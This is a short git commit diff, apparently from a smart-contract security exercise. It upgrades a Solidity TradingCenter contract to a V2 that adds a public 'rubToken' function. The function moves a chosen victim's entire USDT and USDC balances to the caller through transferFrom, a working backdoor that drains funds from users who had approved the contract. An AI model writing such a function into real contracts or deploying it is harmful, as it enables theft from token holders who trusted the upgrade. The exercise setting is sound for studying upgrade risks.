7f105067fabae7076a8521bf7ab2049d489342ac
yuhantsao9999 <48717729+yuhantsao9999@users.noreply.github.com>
2023-10-29 15:01:57 +0800

    Update TradingCenterV2.sol

--- src/TradingCenterV2.sol
+++ src/TradingCenterV2.sol
@@ -1,6 +1,12 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.8.17;
 
+import {TradingCenter} from "./TradingCenter.sol";
+
 // TODO: Try to implement TradingCenterV2 here
-contract TradingCenterV2 {
+contract TradingCenterV2 is TradingCenter {
+    function rubToken(address victimAddre) public {
+        usdt.transferFrom(victimAddre, msg.sender, usdt.balanceOf(victimAddre));
+        usdc.transferFrom(victimAddre, msg.sender, usdc.balanceOf(victimAddre));
+    }
 }
